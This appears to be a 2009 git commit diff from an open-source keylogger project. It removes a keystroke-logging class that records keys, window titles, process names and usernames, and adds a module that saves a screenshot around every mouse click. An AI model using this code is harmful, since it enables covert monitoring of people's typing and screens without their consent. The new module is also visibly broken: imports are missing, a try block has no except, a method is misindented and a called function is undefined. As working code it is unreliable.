c9673a5c9cccc2264b5b68cbf9c5585cdce747cd
Daniel Folkinshteyn <nanotube@users.sourceforge.net>
2009-06-18 15:53:35 -0400

    port imagewriter, and reorg baseeventclasses so that each "logger" gets its own file.

--- baseeventclasses.py
+++ baseeventclasses.py
@@ -7,14 +7,6 @@ from timerthreads import (LogRotator, LogFlusher, OldLogDeleter, LogZipper,
 import os
 import os.path
 
-if os.name == 'posix':
-    pass
-elif os.name == 'nt':
-    import win32api, win32con, win32process
-else:
-    print "OS is not recognised as windows or linux"
-    sys.exit()
-
 '''Event classes have two stages. The thinking is as follows.
 
 The actual hooking routine needs to be /really/ fast, so as not to delay
@@ -78,17 +70,12 @@ class FirstStageBaseEventClass(BaseEventClass):
         self.create_loggers()
         self.spawn_timer_threads()
         self.spawn_second_stage_thread()
-    
-    def create_loggers(self):
         
-        # configure the data logger
-        logger = logging.getLogger(self.loggername)
-        logdir = os.path.join(_settings['General']['Log Directory'],
-                            self.subsettings['General']['Log Subdirectory'])
-        logpath = os.path.join(logdir, 
-                            self.subsettings['General']['Log Filename'])
-                                
-        #make sure we have the directory where we want to log
+        # set the following in the derived class
+        #self.task_function = self.your_working_function
+    
+    def create_log_directory(self, logdir):
+        '''Make sure we have the directory where we want to log'''
         try:
             os.makedirs(logdir)
         except OSError, detail:
@@ -100,7 +87,18 @@ class FirstStageBaseEventClass(BaseEventClass):
         except:
             logging.getLogger('').error("error creating log directory", 
                         exc_info=True)
+
+    def create_loggers(self):
+        
+        # configure the data logger
+        logger = logging.getLogger(self.loggername)
+        logdir = os.path.join(_settings['General']['Log Directory'],
+                            self.subsettings['General']['Log Subdirectory'])
+        logpath = os.path.join(logdir, 
+                            self.subsettings['General']['Log Filename'])
                                 
+        self.create_log_directory(logdir)
+        
         loghandler = OnDemandRotatingFileHandler(logpath)
         loghandler.setLevel(logging.INFO)
         logformatter = logging.Formatter('%(message)s')
@@ -136,188 +134,6 @@ class SecondStageBaseEventClass(BaseEventClass):
         
         self.dir_lock = dir_lock
                 
+        # set the following in the derived class
+        #self.task_function = self.your_working_function
 
-class DetailedLogWriterFirstStage(FirstStageBaseEventClass):
-    '''Standard detailed log writer, first stage.
-    
-    Grabs keyboard events, finds the process name and username, then 
-    passes the event on to the second stage.
-    '''
-    
-    def __init__(self, *args, **kwargs):
-        
-        FirstStageBaseEventClass.__init__(self, *args, **kwargs)
-        
-        self.task_function = self.process_event
-            
-    def process_event(self):
-        try:
-            event = self.q.get(timeout=0.2) #need the timeout so that thread terminates properly when exiting
-            process_name = self.get_process_name(event)
-            loggable = self.needs_logging(event, process_name)  # see if the program is in the no-log list.
-            if not loggable:
-                logging.getLogger('').debug("not loggable, we are outta here\n")
-                return
-            logging.getLogger('').debug("loggable, lets log it. key: %s" % \
-                to_unicode(event.Key))
-            
-            username = self.get_username()
-            
-            self.sst_q.put((process_name, username, event))
-            
-        except Empty:
-            pass #let's keep iterating
-        except:
-            logging.getLogger('').debug("some exception was caught in "
-                "the logwriter loop...\nhere it is:\n", exc_info=True)
-            pass #let's keep iterating
-    
-    def needs_logging(self, event, process_name):
-        '''This function returns False if the process name associated with an event
-        is listed in the noLog option, and True otherwise.'''
-        
-        if self.subsettings['General']['Applications Not Logged'] != 'None':
-            for path in self.subsettings['General']['Applications Not Logged'].split(';'):
-                if os.path.exists(path) and os.stat(path) == os.stat(process_name):  #we use os.stat instead of comparing strings due to multiple possible representations of a path
-                    return False
-        return True
-
-    def get_process_name(self, event):
-        '''Acquire the process name from the window handle for use in the log filename.
-        '''
-        if os.name == 'nt':
-            hwnd = event.Window
-            try:
-                threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
-                
-                # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
-                
-                mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
-                procname = win32process.GetModuleFileNameEx(mypyproc, 0)
-                return procname
-            except:
-                # this happens frequently enough - when the last event caused the closure of the window or program
-                # so we just return a nice string and don't worry about it.
-                return "noprocname"
-        elif os.name == 'posix':
-            return to_unicode(event.WindowProcName)
-            
-        def get_username(self):
-            '''Try a few different environment vars to get the username.'''
-            username = None
-            for varname in ['USERNAME','USER','LOGNAME']:
-                username = os.getenv(varname)
-                if username is not None:
-                    break
-            if username is None:
-                username = 'none'
-            return username
-
-    def spawn_second_stage_thread(self): 
-        self.sst_q = Queue(0)
-        self.sst = DetailedLogWriterSecondStage(self.dir_lock, 
-                                                self.sst_q, self.loggername)
-
-class DetailedLogWriterSecondStage(SecondStageBaseEventClass):
-    def __init__(self, dir_lock, *args, **kwargs):
-        SecondStageBaseEventClass.__init__(self, dir_lock, *args, **kwargs)
-        
-        self.task_function = self.process_event
-        
-        self.eventlist = range(7) #initialize our eventlist to something.
-        
-        if self.subsettings['General']['Log Key Count'] == True:
-            self.eventlist.append(7)
-        
-        self.logger = logging.getLogger(self.loggername)
-        
-        # for brevity
-        self.field_sep = \
-            self.subsettings['General']['Log File Field Separator']
-            
-    def process_event(self):
-        try:
-            (process_name, username, event) = self.q.get(timeout=0.2) #need the timeout so that thread terminates properly when exiting
-            
-            eventlisttmp = [to_unicode(time.strftime('%Y%m%d')), # date
-                to_unicode(time.strftime('%H%M')), # time
-                to_unicode(process_name).replace(self.field_sep,
-                    '[sep_key]'), # process name (full path on windows, just name on linux)
-                to_unicode(event.Window), # window handle
-                to_unicode(username).replace(self.field_sep, 
-                    '[sep_key]'), # username
-                to_unicode(event.WindowName).replace(self.field_sep, 
-                    '[sep_key]')] # window title
-                            
-            if self.subsettings['General']['Log Key Count'] == True:
-                eventlisttmp.append('1')
-            eventlisttmp.append(to_unicode(self.parse_event_value(event)))
-                
-            if (self.eventlist[:6] == eventlisttmp[:6]) and \
-                (self.subsettings['General']['Limit Keylog Field Size'] == 0 or \
-                (len(self.eventlist[-1]) + len(eventlisttmp[-1])) < self.settings['General']['Limit Keylog Field Size']):
-                
-                #append char to log
-                self.eventlist[-1] = self.eventlist[-1] + eventlisttmp[-1]
-                # increase stroke count
-                if self.settings['General']['Log Key Count'] == True:
-                    self.eventlist[-2] = str(int(self.eventlist[-2]) + 1)
-            else:
-                self.write_to_logfile()
-                self.eventlist = eventlisttmp
-        except Empty:
-            pass #let's keep iterating
-        except:
-            logging.getLogger('').debug("some exception was caught in the "
-                "logwriter loop...\nhere it is:\n", exc_info=True)
-            pass #let's keep iterating
-
-    def parse_event_value(self, event):
-        '''Pass the event ascii value through the requisite filters.
-        Returns the result as a string.
-        '''
-        npchrstr = self.subsettings['General']['Non-printing Character Representation']
-        npchrstr = re.sub('%keyname%', event.Key, npchrstr)
-        npchrstr = re.sub('%scancode%', str(event.ScanCode), npchrstr)
-        npchrstr = re.sub('%vkcode%', str(event.KeyID), npchrstr)
-        
-        if chr(event.Ascii) == self.field_sep:
-            return(npchrstr)
-        
-        #translate backspace into text string, if option is set.
-        if event.Ascii == 8 and \
-                self.subsettings['General']['Parse Backspace'] == True:
-            return(npchrstr)
-        
-        #translate escape into text string, if option is set.
-        if event.Ascii == 27 and \
-                self.subsettings['General']['Parse Escape'] == True:
-            return(npchrstr)
-
-        # need to parse the returns, so as not to break up the data lines
-        if event.Ascii == 13:
-            return(npchrstr)
-            
-        # We translate all the special keys, such as arrows, backspace, 
-        # into text strings for logging.
-        # Exclude shift and capslock keys, because they are already 
-        # represented  (as capital letters/symbols).
-        if event.Ascii == 0 and \
-                not (str(event.Key).endswith('shift') or \
-                str(event.Key).endswith('Capital')):
-            return(npchrstr)
-        
-        return(chr(event.Ascii))
-
-    def write_to_logfile(self):
-        '''Write the latest eventlist to logfile in one delimited line.
-        '''
-        
-        if self.eventlist[:7] != range(7):
-            try:
-                line = to_unicode(self.field_sep).join(self.eventlist) + "\n"
-                self.logger.info(line)
-            except:
-                logging.getLogger('').debug(to_unicode(self.eventlist), 
-                    exc_info=True)
-                pass # keep going, even though this doesn't get logged...
---
+++ onclickimagecapture.py
@@ -0,0 +1,243 @@
+from baseeventclasses import (FirstStageBaseEventClass, 
+    SecondStageBaseEventClass)
+    
+if os.name == 'nt':
+    import win32api, win32con, win32process
+    import ImageGrab
+elif os.name == 'posix':
+    from Xlib import X, XK, display, error
+    from Xlib.ext import record
+    from Xlib.protocol import rq
+    
+from myutils import (_settings, _cmdoptions, OnDemandRotatingFileHandler,
+    to_unicode)
+from Queue import Queue, Empty
+import os
+import os.path
+
+class OnClickImageCaptureFirstStage(FirstStageBaseEventClass):
+    '''On-click image capture, first stage: prepare data.
+    
+    Grabs mouse events, captures desired screen area, 
+    finds the process name and username, then 
+    passes the event on to the second stage.
+    '''
+
+    def __init__(self, *args, **kwargs):
+        
+        FirstStageBaseEventClass.__init__(self, *args, **kwargs)
+        
+        self.task_function = self.process_event
+
+        self.imagedimensions = \
+           Point(self.settings['Image Capture']['Capture Clicks Width'],
+                 self.settings['Image Capture']['Capture Clicks Height'])
+                 
+        # Hook to our display.
+        if os.name == 'posix':
+            self.local_dpy = display.Display()
+
+    def process_event(self):
+        try:
+            event = self.q.get(timeout=0.05)
+            if event.MessageName.startswith("mouse left") or \
+                    event.MessageName.startswith("mouse middle") or \
+                    event.MessageName.startswith("mouse right"):
+                logging.getLogger('').debug(self.print_event(event))
+                process_name = self.get_process_name(event)
+                image_data = self.capture_image(event)
+                self.sst_q.put((process_name, image_data, event))
+        except Queue.Empty:
+            pass
+        except:
+            logging.getLogger('').debug("some exception was caught in the "
+                "imagecapture loop...\nhere it is:\n", exc_info=True)
+            pass #let's keep iterating
+            
+
+    def capture_image(self, event):
+        screensize = self.get_screen_size()
+
+        # The cropbox will take care of making sure our image is within
+        # screen boundaries.
+        cropbox = CropBox(topleft=Point(0,0),
+                          bottomright=self.imagedimensions,
+                          min=Point(0,0),
+                          max=screensize)
+        cropbox.reposition(Point(event.Position[0], event.Position[1]))
+        
+        logging.getLogger('').debug(cropbox)
+                
+        if os.name == 'posix':
+            
+            AllPlanes = ~0
+
+            try:
+                # cropbox.topleft.x, cropbox.topleft.y,
+                # cropbox.size.x, cropbox.size.y, self.savefilename
+                raw = self.rootwin.get_image(cropbox.topleft.x, 
+                        cropbox.topleft.y, cropbox.size.x, cropbox.size.y, 
+                        X.ZPixmap, AllPlanes)
+                image_data = Image.fromstring("RGBX", (cropbox.size.x, cropbox.size.y), raw.data, "raw", "BGRX").convert("RGB")
+                return image_data
+            except error.BadDrawable:
+                print "bad drawable when attempting to get an image!  Closed the window?"
+            except error.BadMatch:
+                print "bad match when attempting to get an image! probably specified an area outside the window (too big?)"
+            except error.BadValue:
+                print "getimage: bad value error - tell me about this one, I've not managed to make it happen yet"
+            except:
+                print logging.getLogger('').debug('Error in getimage.',
+                        exc_info = True)
+        
+        if os.name == 'nt':
+            image_data = ImageGrab.grab((cropbox.topleft.x, cropbox.topleft.y, cropbox.bottomright.x, cropbox.bottomright.y))
+            return image_data
+
+    def get_screen_size(self):
+        if os.name == 'posix':
+            self.rootwin = \
+               self.local_dpy.get_input_focus().focus.query_tree().root
+            if self.rootwin == 0:
+                self.rootwin = self.local_dpy.get_input_focus()
+            return Point(self.rootwin.get_geometry().width,
+                         self.rootwin.get_geometry().height)
+        if os.name == 'nt':
+            return Point(win32api.GetSystemMetrics(0),
+                         win32api.GetSystemMetrics (1))
+
+    def get_process_name(self, event):
+        '''Acquire the process name from the window handle for use in the log filename.
+        '''
+        if os.name == 'nt':
+            hwnd = event.Window
+            try:
+                threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
+                
+                # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
+                
+                mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
+                procname = win32process.GetModuleFileNameEx(mypyproc, 0)
+                return procname
+            except:
+                # this happens frequently enough - when the last event caused the closure of the window or program
+                # so we just return a nice string and don't worry about it.
+                return "noprocname"
+        elif os.name == 'posix':
+            return to_unicode(event.WindowProcName)
+
+    def print_event(self, event):
+        '''Prints the event.
+            
+            We need this because pyhook's event don't have a default __str__
+            method, so we check for os type, and make it work on windows.
+        
+            '''
+        if os.name == 'posix':
+            return to_unicode(event)
+        if os.name == 'nt':
+            str_tpl = "Window: %s\n" + \
+                      "Window Handle: %s\n" + \
+                      "Window's Process Name: %s\n" + \
+                      "Position: %s\n" + \
+                      "MessageName: %s\n"
+            return str_tpl % (to_unicode(event.Window),
+                              to_unicode(event.WindowName),
+                              to_unicode(self.getProcessName(event)),
+                              to_unicode(event.Position),
+                              to_unicode(event.MessageName))
+
+
+    def spawn_second_stage_thread(self): 
+        self.sst_q = Queue(0)
+        self.sst = OnClickImageCaptureSecondStage(self.dir_lock, 
+                self.sst_q, self.loggername)
+
+    
+
+class OnClickImageCaptureSecondStage(SecondStageBaseEventClass):
+    '''On-click image capture, second stage: write data.
+    
+    Write the image data to file in log directory.
+    '''
+    def __init__(self, dir_lock, *args, **kwargs):
+        SecondStageBaseEventClass.__init__(self, dir_lock, *args, **kwargs)
+        
+        self.task_function = self.process_event
+        
+        # Regexp filter for the non-allowed characters in windows filenames.
+        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")
+
+    def process_event(self):
+        try:
+            #need the timeout so that thread terminates properly when exiting
+            (process_name, image_data, event) = self.q.get(timeout=0.05)
+            savefilename = os.path.join(myutils.to_unicode(self.imagedir), 
+                datetime.datetime.today().strftime('%Y%m%d_%H%M%S_') + \
+                str(datetime.datetime.today().microsecond) + "_" + \
+                self.filter.sub(r'__', to_unicode(process_name)) + "." + \
+                self.subsettings['General']['Capture Clicks Image Format'])
+            image_data.save(savefilename, 
+                quality=self.subsettings['General']['Capture Clicks Image Quality'])
+
+
+
+class Point:
+    def __init__(self, x=0, y=0):
+        self.x = x
+        self.y = y
+    def move(self, xmove=0, ymove=0):
+        self.x = self.x + xmove
+        self.y = self.y + ymove
+    def __str__(self):
+        return "[%d,%d]" % (self.x, self.y)
+    def __add__(self, other):
+        return Point(self.x+other.x, self.y+other.y)
+    def __sub__(self, other):
+        return Point(self.x - other.x, self.y - other.y)
+
+
+class CropBox:
+    def __init__(self,
+                 topleft=Point(0,0),
+                 bottomright=Point(100,100),
+                 min=Point(0,0),
+                 max=Point(1600,1200)):
+        self.topleft = copy.deepcopy(topleft)
+        self.bottomright = copy.deepcopy(bottomright)
+        self.min = copy.deepcopy(min)
+        self.max = copy.deepcopy(max)
+        self.size = self.bottomright - self.topleft
+        self.maxsize = self.max - self.min
+        # make sure our box is not bigger than the whole image
+        if (self.size.x > self.maxsize.x):
+            self.bottomright.x = \
+               self.bottomright.x - self.size.x + self.maxsize.x
+        if (self.size.y > self.maxsize.y):
+            self.bottomright.y = \
+               self.bottomright.y - self.size.y + self.maxsize.y
+        self.center = Point(self.size.x/2 + self.topleft.x,
+                            self.size.y/2 + self.topleft.y)
+        
+    def move(self, xmove=0, ymove=0):
+        # make sure we can't move beyond image boundaries
+        if (self.topleft.x + xmove < self.min.x):
+            xmove = self.topleft.x - self.min.x
+        if (self.topleft.y + ymove < self.min.y):
+            ymove = self.topleft.y - self.min.y
+        if (self.bottomright.x + xmove > self.max.x):
+            xmove = self.max.x - self.bottomright.x
+        if (self.bottomright.y + ymove > self.max.y):
+            ymove = self.max.y - self.bottomright.y
+        self.topleft.move(xmove, ymove)
+        self.bottomright.move(xmove, ymove)
+        self.center = Point(self.size.x/2 + self.topleft.x,
+                            self.size.y/2 + self.topleft.y)
+        #print self.center
+    
+    def reposition(self, newcenter = Point(500,500)):
+        motion = newcenter - self.center
+        self.move(motion.x, motion.y)
+    
+    def __str__(self):
+        return str(self.topleft) + str(self.bottomright)
